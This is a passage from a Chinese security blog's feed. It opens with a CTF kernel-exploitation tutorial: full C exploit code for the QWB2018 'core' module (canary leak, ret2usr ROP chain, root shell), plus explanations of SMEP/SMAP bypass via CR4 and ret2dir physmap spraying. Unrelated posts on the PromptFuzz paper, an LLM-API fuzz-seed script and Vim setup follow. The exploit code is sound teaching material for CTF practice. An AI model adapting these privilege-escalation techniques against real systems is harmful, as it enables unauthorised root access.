class="line"><span class="meta">#<span class="keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// define symbols variables</span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>, kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// enter kernel func: save status </span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] Failed to get the root!&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    log_success(<span class="string">&quot;[+] Successful to get the root.&quot;</span>);</span><br><span class="line">    log_info(<span class="string">&quot;[*] Execve root shell now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// to exit normally, instead of potential segmentation fault</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*prepare_kernel_cred_kfunc)(<span class="type">void</span> *task_struct);</span><br><span class="line"><span class="type">int</span> (*commit_creds_kfunc)(<span class="type">void</span> *cred);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ret2usr_attack</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    prepare_kernel_cred_kfunc = (<span class="type">void</span>*(*)(<span class="type">void</span>*)) prepare_kernel_cred;</span><br><span class="line">    commit_creds_kfunc = (<span class="type">int</span> (*)(<span class="type">void</span> *))commit_creds;</span><br><span class="line"></span><br><span class="line">    (*commit_creds_kfunc)((*prepare_kernel_cred_kfunc)(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, user_ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, user_sp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;sub rax, 8;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, user_cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;lea rax, get_root_shell;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;swapgs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;iretq;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// interact with /proc/core</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889b</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off_val</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889c</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889a</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploition</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS            0xffffffff8109c8e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET             0xffffffff81000b2f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RDI_RAX_CALL_RDX    0xffffffff8101aa6a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDX_RET             0xffffffff810a0f49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RCX_RET             0xffffffff81021e53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POPFQ_RET        0xffffffff81a012da</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ                   0xffffffff81050ac2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploition</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    FILE *ksyms_file;</span><br><span class="line">    <span class="comment">// open device</span></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="type">size_t</span> canary;</span><br><span class="line">    <span class="type">size_t</span> rop_chain[<span class="number">0x100</span>], i;</span><br><span class="line">    </span><br><span class="line">    log_info(<span class="string">&quot;[*] Start to exploit...&quot;</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] open device error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get addresses of kernel symbols</span></span><br><span class="line">    log_info(<span class="string">&quot;[*] Reading /tmp/kallsyms...&quot;</span>);</span><br><span class="line">    ksyms_file = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ksyms_file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] Failed to open the sym_table file!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(ksyms_file, <span class="string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (prepare_kernel_cred &amp;&amp; commit_creds) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                SUCCESS_MSG(<span class="string">&quot;[+] Successful to get the addr of commit_creds: &quot;</span>)</span><br><span class="line">                <span class="string">&quot;%lx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(SUCCESS_MSG(</span><br><span class="line">                <span class="string">&quot;[+] Successful to get the addr of prepare_kernel_cred: &quot;</span>)</span><br><span class="line">                <span class="string">&quot;%lx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_offset = commit_creds - COMMIT_CREDS;</span><br><span class="line">    kernel_base += kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        SUCCESS_MSG(<span class="string">&quot;[+] Got kernel base: &quot;</span>) <span class="string">&quot;%lx&quot;</span></span><br><span class="line">        SUCCESS_MSG(<span class="string">&quot; , kaslr offset: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>,</span><br><span class="line">        kernel_base,</span><br><span class="line">        kernel_offset</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak canary</span></span><br><span class="line">    log_info(<span class="string">&quot;[*] Reading value of kernel stack canary...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    set_off_val(fd, <span class="number">64</span>);</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    canary = ((<span class="type">size_t</span>*) buf)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(SUCCESS_MSG(<span class="string">&quot;[+] Got kernel stack canary: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// build rop chain</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">        rop_chain[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop_chain[i++] = (<span class="type">size_t</span>) ret2usr_attack;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Start to execute ROP chain in kernel space...&quot;</span>);</span><br><span class="line">    write(fd, rop_chain, <span class="number">0x800</span>);</span><br><span class="line">    core_copy(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    exploition();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ret2usr-with-SMAP-SMEP-Bypass"><a href="#ret2usr-with-SMAP-SMEP-Bypass" class="headerlink" title="ret2usr with SMAP&#x2F;SMEP Bypass"></a>ret2usr with SMAP&#x2F;SMEP Bypass</h4><p>需要先关闭SMEP保护。</p>
<p>intel下系统根据CR4控制寄存器的第20、21位标识来确定是否开启SMEP&#x2F;SMAP保护（1为开启，0为关闭），若是能改变CR4寄存器的值就能关闭保护。</p>
<img src="/posts/8981f97e/sYFKuZiUVNIclBp.png" class="" title="image.png">

<p>可以使用<code>cat /proc/cpuinfo</code>查看其中开启的保护类型</p>
<h4 id="例题：强网杯2018-core-3"><a href="#例题：强网杯2018-core-3" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h4><p>在启动脚本中添加smep和smap保护：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 1024M \</span><br><span class="line">-cpu qemu64-v1,+smep,+smap \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs_patched.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic </span><br></pre></td></tr></table></figure>

<p>需要通过ROP来关闭SMEP&#x2F;SMAP，直接给CR4复制0x6f0即可</p>
<p>使用到的gadgets</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AND_RAX_RDI_RET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RAX_PUSH_RCX_POPFQ_RET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX_RET</span></span><br></pre></td></tr></table></figure>

<p>直接修改CR4为0x6f0即可</p>
<img src="/posts/8981f97e/image-20250602191048298.png" class="" title="image-20250602191048298">

<h2 id="03-Kernel-ROP-ret2dir"><a href="#03-Kernel-ROP-ret2dir" class="headerlink" title="03. Kernel ROP - ret2dir"></a>03. Kernel ROP - ret2dir</h2><p>ret2dir（return to direct mapping area）</p>
<p>绕过smep&#x2F;smap&#x2F;pxn等用户空间与内核空间隔离的防护手段。</p>
<p>x86下的Linux kernel的内存布局，存在一块区域<code>direct mapping area</code>，内核的线性映射区，线性地直接映射了整个物理内存空间。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</span><br></pre></td></tr></table></figure>

<p>这块区域存在意味着：对于一个被用户进程使用的物理页框，同时存在着一个用户空间地址和内核空间地址到该物理页框的映射，即我们利用这两个地址进行内存访问时访问的是同一个物理页框</p>
<p>当开启SMEP、SMAP、PXN等防护时，内核空间到用户空间的直接访问被禁止，无法直接使用ret2usr的攻击方式，但利用内核线性映射区对整个物理地址空间的映射，我们可以利用一个内核空间上的地址访问到用户空间的数据。</p>
<p>下图为攻击示例，我们在用户空间中布置的gadget可以通过direct mapping area上的地址在内核空间中访问到。</p>
<img src="/posts/8981f97e/2QMrXEh9qLymCoK.png" class="" title="image.png">

<p>在新版的内核当中<code>direct mapping area</code>已经不再具有可执行权限，因此仍然需要在用户空间布置ROP链来完成利用</p>
<p>一种朴素的方法：</p>
<ul>
<li>利用mmap在用户空间大量申请内存</li>
<li>利用漏洞泄漏内核的“堆”上地址（通过kmalloc获取到的地址），这个地址直接来自于线性映射区</li>
<li>利用泄露出的内核线性映射区的地址进行内存搜索，从而找到我们在用户空间的内存</li>
</ul>
<p>但是一般很难实现搜索，可以使用喷射的方法来命中。</p>
<h3 id="例题：MINI-LCTF2022-kgagdet"><a href="#例题：MINI-LCTF2022-kgagdet" class="headerlink" title="例题：MINI-LCTF2022 - kgagdet"></a>例题：MINI-LCTF2022 - kgagdet</h3><p>启动脚本关闭了KASLR，开启了SMEP&#x2F;SMAP保护</p>
<p>分析漏洞内核模块<code>kgadget.ko</code></p>
<p>kernel_module_init函数注册了<code>/dev/kgadget</code>设备</p>
<img src="/posts/8981f97e/image-20250602192427811.png" class="" title="image-20250602192427811">

<p>其文件操作结构体定义如下，注册了write, ioctl, open, release操作函数：</p>
<img src="/posts/8981f97e/image-20250602192533405.png" class="" title="image-20250602192533405">

<p><code>kgadget_write</code>函数没什么用</p>
<img src="/posts/8981f97e/image-20250602192638924.png" class="" title="image-20250602192638924">

<p><code>kgadget_ioctl</code>函数向栈空间写入内容，同时会解引用param的值作为函数指针执行。</p>
<img src="/posts/8981f97e/image-20250602192804072.png" class="" title="image-20250602192804072">

<p>不能直接将其写为用户空间地址</p>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用ret2dir + physmap spray</p>
<p>在用户空间布置恶意数据，然后在内核空间的direct mapping area区域找到对应地址即可。</p>
<p>使用栈迁移，将栈迁移到用户空间布置的恶意数据上，随后在恶意数据靠后的位置布置提权降落回用户态的ROP链即可。</p>
<p>在每个内存页都是三段式的ROP链，<code>栈迁移 - ret滑板 - 常规ROP链</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>PromptFuzz论文阅读</title>
    <url>/posts/b532f894.html</url>
    <content><![CDATA[<p><strong>题目</strong>：Prompt Fuzzing for Fuzz Driver Generation  </p>
<p><strong>期刊&#x2F;会议</strong>：CCS 2024</p>
<p><strong>作者</strong>：Hao Chen （腾讯Big data Lab）</p>
<h2 id="论文简介"><a href="#论文简介" class="headerlink" title="论文简介"></a>论文简介</h2><p><strong>主题</strong>：提出了一种新的基于提示词对库文件进行fuzz的方法。</p>
<p><strong>背景</strong>：对标准库的fuzz存在几个难点</p>
<ul>
<li>api函数覆盖度不够（hopper给予解决，但其种子的输入空间太大）</li>
<li>种子输入空间太大，如何生成高质量的种子才能进入到较深的分支。</li>
</ul>
<p><strong>整体架构</strong>：</p>
<ul>
<li>Instructive Program Generation：提取库的类型定义以及api函数定义，喂给大模型初步生成fuzz driver( Program Instance)。</li>
<li>Erroneous Program Validation：运行Program Instance（有fuzz语料库），去除错误程序（检查运行状态），同时获取代码覆盖率。</li>
<li>Coverage Guide Mutation：将其代码覆盖率反馈给大模型，对Program Instance进行变异，添加或删除api函数。</li>
<li>Constrained Fuzzer Scheduling：提取输入的约束，并根据约束将输入值从大模型提供的常数值修改成模糊测试输入。进行模糊测试</li>
</ul>
<p>其实相当于在fuzz前又做了一个对fuzz driver的fuzz，可以获取到高质量的fuzz driver。</p>
<img src="/posts/b532f894/image-20250616172647380.png" class="" title="image-20250616172647380">

<h2 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="Instructive-Program-Generation"><a href="#Instructive-Program-Generation" class="headerlink" title="Instructive Program Generation"></a>Instructive Program Generation</h3><p>其提示词如下：</p>
<img src="/posts/b532f894/image-20250616174337281.png" class="" title="image-20250616174337281">

<h3 id="Erroneous-Program-Validation"><a href="#Erroneous-Program-Validation" class="headerlink" title="Erroneous Program Validation"></a>Erroneous Program Validation</h3><p>分为三步：</p>
<ol>
<li>去除语法错误</li>
<li>使用fuzzing语料库来查看目标程序是否存在显著语义错误</li>
<li>移除无效或价值不大的测试驱动</li>
</ol>
<img src="/posts/b532f894/image-20250616175036108.png" class="" title="image-20250616175036108">



<blockquote>
<p>碎碎念，先看到这里了，因为是针对源码的，与本人研究方向不是很相关，当然其fuzz fuzz_driver的思想很不错，很新颖。</p>
</blockquote>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>国内GPT中转配置方案</title>
    <url>/posts/eee3f851.html</url>
    <content><![CDATA[<h2 id="国内GPT中转配置方案"><a href="#国内GPT中转配置方案" class="headerlink" title="国内GPT中转配置方案"></a>国内GPT中转配置方案</h2><p><strong>官网主页</strong>：<a href="https://api.bianxie.ai/">https://api.bianxie.ai/</a></p>
<p>软件&#x2F;代码&#x2F;插件接入使用便携AI聚合API需要两个数据：</p>
<ol>
<li><strong>BASE_URL</strong>：有的软件里也叫API URL或者OPENAI_API_BASE，都是一个意思，就是说你从这个链接调用服务；</li>
<li><strong>API Key</strong>：就是令牌，以sk-开头的一长串字符。</li>
</ol>
<p><strong>客户端工具</strong>：<a href="https://github.com/Dooy/chatgpt-web-midjourney-proxy">https://github.com/Dooy/chatgpt-web-midjourney-proxy</a></p>
<p>配置BASE_URL和API_KEY即可直接使用</p>
<h2 id="GPT-API使用参考模版"><a href="#GPT-API使用参考模版" class="headerlink" title="GPT API使用参考模版"></a>GPT API使用参考模版</h2><p>以一个调用LLM读取报文协议生成模糊测试初始化种子的demo为例</p>
<p>文件目录树：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ tree                          </span><br><span class="line">.</span><br><span class="line">├── config</span><br><span class="line">│   ├── config.yaml</span><br><span class="line">│   └── prompts</span><br><span class="line">│       ├── generate_seeds.txt</span><br><span class="line">│       └── packet</span><br><span class="line">└──  llm_generate_seeds.py</span><br></pre></td></tr></table></figure>

<p>模版代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> openai</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span></span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SeedsGenerator</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;种子生成器，用于生成相关服务协议的初始化种子&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, config_path: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        初始化种子生成器</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            config_path: 配置文件路径</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 加载配置</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(config_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.config = yaml.safe_load(f)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 设置OpenAI API</span></span><br><span class="line">        <span class="variable language_">self</span>.client = openai.OpenAI(</span><br><span class="line">            api_key=<span class="variable language_">self</span>.config[<span class="string">&#x27;deepseek&#x27;</span>][<span class="string">&#x27;api_key&#x27;</span>],</span><br><span class="line">            base_url=<span class="variable language_">self</span>.config[<span class="string">&#x27;deepseek&#x27;</span>][<span class="string">&#x27;base_url&#x27;</span>]</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 加载提示词模板</span></span><br><span class="line">        prompt_dir = os.path.join(os.path.dirname(config_path), <span class="string">&#x27;prompts&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(prompt_dir, <span class="string">&#x27;packet&#x27;</span>), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.packet_prompt = f.read()</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 加载提示词模板</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(prompt_dir, <span class="string">&#x27;generate_seeds.txt&#x27;</span>), <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.analyze_prompt = f.read()</span><br><span class="line">        </span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 设置日志记录器</span></span><br><span class="line">        <span class="variable language_">self</span>.logger = logging.getLogger(<span class="string">&#x27;SeedsGenerator&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.logger.handlers:</span><br><span class="line">            handler = logging.StreamHandler()</span><br><span class="line">            formatter = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">            handler.setFormatter(formatter)</span><br><span class="line">            <span class="variable language_">self</span>.logger.addHandler(handler)</span><br><span class="line">            <span class="variable language_">self</span>.logger.setLevel(logging.INFO)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_seeds</span>(<span class="params">self</span>) -&gt; <span class="type">Dict</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        生成初始化种子</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            初始化种子，保存在seeds目录下</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 构建提示词</span></span><br><span class="line">            prompt = <span class="variable language_">self</span>.analyze_prompt.<span class="built_in">format</span>(</span><br><span class="line">                packet = <span class="variable language_">self</span>.packet_prompt</span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 调用OpenAI API</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable language_">self</span>.logger.info(<span class="string">&quot;生成初始化种子...&quot;</span>)</span><br><span class="line">            response = <span class="variable language_">self</span>.client.chat.completions.create(</span><br><span class="line">                model=<span class="variable language_">self</span>.config[<span class="string">&#x27;deepseek&#x27;</span>][<span class="string">&#x27;model&#x27;</span>],</span><br><span class="line">                messages=[</span><br><span class="line">                    &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;你是一个专业的模糊测试专家。请严格按照指定格式输出结果。&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: prompt&#125;</span><br><span class="line">                ],</span><br><span class="line">                temperature=<span class="number">0.3</span></span><br><span class="line">            )</span><br><span class="line">             </span><br><span class="line">            <span class="comment"># 解析响应</span></span><br><span class="line">            result = response.choices[<span class="number">0</span>].message.content</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 解析分析结果</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;seeds&quot;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&quot;seeds&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;seeds/seed_llm&quot;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(result.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="variable language_">self</span>.logger.info(<span class="string">&quot;初始化种子生成成功，保存在seeds/seed_llm&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="variable language_">self</span>.logger.error(<span class="string">f&quot;分析报文时发生错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.logger.error(traceback.format_exc())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 初始化种子生成器</span></span><br><span class="line">    generator = SeedsGenerator(<span class="string">&#x27;./config/config.yaml&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 生成初始化种子</span></span><br><span class="line">    seeds = generator.generate_seeds()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>使用的话直接在<code>config/config.yaml</code>里添加各类参数，<code>config/prompts</code>添加提示词即可。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deepseek:</span></span><br><span class="line">  <span class="attr">api_key:</span> <span class="string">&quot;sk-XXXXXXXXXXXXXXXXXXXXXXXX&quot;</span></span><br><span class="line">  <span class="attr">base_url:</span> <span class="string">&quot;https://api.deepseek.com&quot;</span></span><br><span class="line">  <span class="attr">model:</span> <span class="string">&quot;deepseek-chat&quot;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim配置方案</title>
    <url>/posts/d3945d8b.html</url>
    <content><![CDATA[<h1 id="Vim配置方案"><a href="#Vim配置方案" class="headerlink" title="Vim配置方案"></a>Vim配置方案</h1><p>参考链接：</p>
<ul>
<li><a href="https://cloud.tencent.com/developer/article/2038154">Vim的终极配置方案，完美的写代码界面! ——.vimrc[通俗易懂]</a></li>
<li><a href="https://blog.csdn.net/zhangpower1993/article/details/52184581">vim插件管理器：Vundle的介绍及安装（很全）</a></li>
</ul>
<p>在<code>~/.vimrc</code>修改配置即可：</p>
<h2 id="安装Vundle"><a href="#安装Vundle" class="headerlink" title="安装Vundle"></a>安装Vundle</h2><p>安装插件工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim</span><br></pre></td></tr></table></figure>

